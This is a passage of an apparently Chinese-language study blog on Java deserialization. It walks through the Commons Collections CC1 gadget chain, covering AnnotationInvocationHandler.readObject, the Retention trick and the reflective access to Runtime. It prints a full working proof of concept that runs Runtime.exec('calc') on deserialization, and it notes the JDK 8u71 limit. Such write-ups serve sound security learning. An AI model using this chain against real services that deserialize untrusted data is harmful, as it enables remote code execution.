printMap(outerMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// transformedMapTest();</span></span><br><span class="line">        <span class="comment">// constantTransformerTest();</span></span><br><span class="line">        <span class="comment">// invokerTransformerTest();</span></span><br><span class="line">        <span class="comment">// chainedTransformerTest();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 想要对键值对进行的操作</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span>  Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;KeyTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello key&quot;</span>; <span class="comment">// 或者是单纯的hello key</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValueTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span>  Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ValueTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello value&quot;</span>;   <span class="comment">// 或者是单纯的hello value</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="正轨-CC1分析"><a href="#正轨-CC1分析" class="headerlink" title="正轨: CC1分析"></a>正轨: CC1分析</h2><h3 id="触发点-sun-reflect-annotation-AnnotationInvocationHandle-readObject"><a href="#触发点-sun-reflect-annotation-AnnotationInvocationHandle-readObject" class="headerlink" title="触发点: sun.reflect.annotation.AnnotationInvocationHandle.readObject()"></a>触发点: sun.reflect.annotation.AnnotationInvocationHandle.readObject()</h3><blockquote><p>在上面的命令执行中，最终我们是手动的执行了put()方法来实现了漏洞的触发。在反序列化中，<em><strong>我们需要找到一个可以用的类的readObject()方法</strong></em>，通过这个方法最终可以触发漏洞</p></blockquote><ol><li><p>sun.reflect.annotation.AnnotationInvocationHandle.readObject()</p><ol><li>注意到其中调用了var5.setValue()，var5 -&gt; var4 -&gt; this.memberValues，于是加上前面的部分</li><li>这下好了，在var2处传入我们使用<code>TransformedMap</code>构造的命令执行链，就可以实现在<code>readObject()</code>时通过<code>setValue()</code>进行调用</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...很多东西</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       var1.defaultReadObject();</span><br><span class="line">       <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">       <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">           Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">           <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">           <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">           <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">               <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                   var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="CC1逐步构造poc"><a href="#CC1逐步构造poc" class="headerlink" title="CC1逐步构造poc"></a>CC1逐步构造poc</h3><h4 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h4><ol><li><p>分析完毕后，可以知道我们构造POC的时候，就需要创建一个AnnotationInvocationHandler对象，并将前面构造的HashMap设置进来</p></li><li><p><strong>尝试1:</strong> 因为 sun.reflect.annotation.AnnotationInvocationHandler 是在JDK内部的类(这里构造函数没有public，是default的私有的)，不能直接使用new来实例化，同时需要使用到的Runtime命令执行要怎么办？</p><ol><li>解决方法：<strong>使用反射进行获取并设置可达性(Runtime详见Q: 如何解决Runtime无法进行序列化)</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 仅仅是大体思路：构造AnnotationInvocationHandler对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure></li><li><p><strong>尝试2:</strong> 尝试1无法成功反序列化，细读readObject()中的细节 <strong>(详见Q: 为什么需要使用Retention.class)</strong></p><ol><li>解决方法：这里需要传入一个Rentention并且<code>innerMap.put(&quot;value&quot;,&quot;whaterver&quot;)</code></li></ol></li></ol><h4 id="Q-如何解决Runtime无法进行序列化"><a href="#Q-如何解决Runtime无法进行序列化" class="headerlink" title="Q: 如何解决Runtime无法进行序列化"></a>Q: 如何解决Runtime无法进行序列化</h4><blockquote><p>在序列化的时候会报无法序列化的错误。原因就在于Runtime类并没有实现Serializable接口，所以无法序列化</p></blockquote><ol><li><p>p牛的解决方法是: <strong>Class类有实现Serializable接口</strong>，可以进行序列化。那这里通过<strong>反射</strong>来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，实现了从java.lang.Runtime对象到java.lang.Class对象的转变 –&gt; <strong>传递Class对象</strong>，然后利用InvokerTransformer调用方法最终获取Runtime对象</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通反射写法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cc利用反射写法</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="comment">// 这一个Transformers[]有整整的4个转换器</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),    <span class="comment">// Class对象可以进行反序列化</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></li></ol><h4 id="Q-什么是Annotation类-为什么需要使用Retention-class"><a href="#Q-什么是Annotation类-为什么需要使用Retention-class" class="headerlink" title="Q: 什么是Annotation类?为什么需要使用Retention.class?"></a>Q: 什么是Annotation类?为什么需要使用Retention.class?</h4><ol><li>见readObject()<ol><li><p>发现有var7!&#x3D;null -&gt; var3.get(var6) -&gt; var6 &#x3D; (String)var5.getKey(); var3 &#x3D; var2.memberTyes() -&gt; var2 &#x3D; null</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>还会涉及到Java注释相关的技术，p牛也不分析，只给出两个结论，想具体了解见最Ref最后一篇文章</p><ol><li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li><li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li></ol></li><li><p>使用Retention: Retention有一个方法，名为value；所以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素<code>innerMap.put(&quot;value&quot;,&quot;whatever string&quot;);</code></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="CC1最终poc"><a href="#CC1最终poc" class="headerlink" title="CC1最终poc"></a>CC1最终poc</h4><blockquote><p>p牛版本的poc，使用TransformedMap实现的</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;h3110 w0r1d&quot;</span>);    <span class="comment">// 这里选择value来解决刚好，因为key有限制，可以将值替换掉</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 反射获取sun.reflect.annotation.AnnotationInvocationHandler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">                <span class="comment">// (Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2)</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class, outerMap);</span><br><span class="line">                <span class="comment">// Retention涉及到注解机制，这里先记下结论</span></span><br><span class="line">                <span class="comment">// outerMap是构造了的payload</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">                <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">                <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h3><blockquote><p>JDK8u71之前</p></blockquote><ol><li><em><strong>原因</strong></em><ol><li>在8u71以后大概是2015年12月的时候，Java官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数：<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d">查看变化</a></li><li>有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，<strong>后续对Map的操作都是基于这个新的LinkedHashMap对象</strong>，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了</li></ol></li></ol><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap?"></a>LazyMap?</h3><ol><li><em><strong>关于LazyMap</strong></em><ol><li>ysoserial的代码没有用到TransformedMap，而是改用了LazyMap。这并不是是在解决CommonCollections1这个利用链在高版本Java中不可用的问题，即使使用LazyMap仍然无法在高版本的Java中使用这条利用链，主要原因还是出在sun.reflect.annotation.AnnotationInvocationHandler 这个类的修改上，不过我还没学</li><li>总结，后面再学</li></ol></li></ol><h2 id="后话-如何正确快速的分析一个程序-链子"><a href="#后话-如何正确快速的分析一个程序-链子" class="headerlink" title="*后话: 如何正确快速的分析一个程序&#x2F;链子"></a>*后话: 如何正确快速的分析一个程序&#x2F;链子</h2><ol><li>从应用入手</li><li>理解应用运行逻辑后再细读找出类逻辑 –&gt; 可以更好地抓住细节</li><li>从条件来说<ol><li>java是一种编译型语言，但是又拥有动态机制，<strong>静态编译时检查主要在于类型与语法，对于需要动态的内容只有运行到那里再结合异常机制才可以进行处理</strong>，这里可以确定我们最少需要的类型 –&gt; <strong>null也会看类型的，整体上应该说是xxx类型的变量被赋值为null</strong><ol><li><strong>反射（Reflection）</strong></li><li><strong>动态代理（Dynamic Proxies）</strong></li><li><strong>类加载器（Class Loaders）</strong></li><li>动态编译（Just-In-Time Compilation, JIT）: (CS61B中讲过)JVM包含一个JIT编译器，它可以在运行时将字节码编译成本地机器码，从而提高性能</li><li>脚本引擎（Scripting Engine）：Java SE 6及更高版本提供了javax.script包，支持在Java程序中嵌入脚本语言（如JavaScript、Groovy等）</li></ol></li><li>注解机制<ol><li>使用<code>@Nullable</code>和<code>@NonNull</code>注解本身不会直接进行检查，但它们可以与静态分析工具配合使用，以在编译时或开发过程中捕获潜在的 NullPointerException</li></ol></li></ol></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java反序列化漏洞利用<ol><li>java安全漫谈反序列化(1)</li><li>白日梦组长</li></ol></li><li>CC1<ol><li><a href="https://www.anquanke.com/post/id/261724">每一条链都有一些概念的解析，再找一些资料理解就透彻了</a></li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0(%E4%B8%8A).md">信工所的大佬写的文章就是nb</a></li><li><a href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478">cc1_TransformedMap祖师爷</a></li><li><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/">长亭科技</a></li><li><a href="https://d4n-sec.github.io/p/cc1demo/">有针对Retention的</a><ol><li>可以一步一步调试出来的</li></ol></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(2)_URLDNS链入门</title>
      <link href="/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"/>
      <url>/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/</url>
      
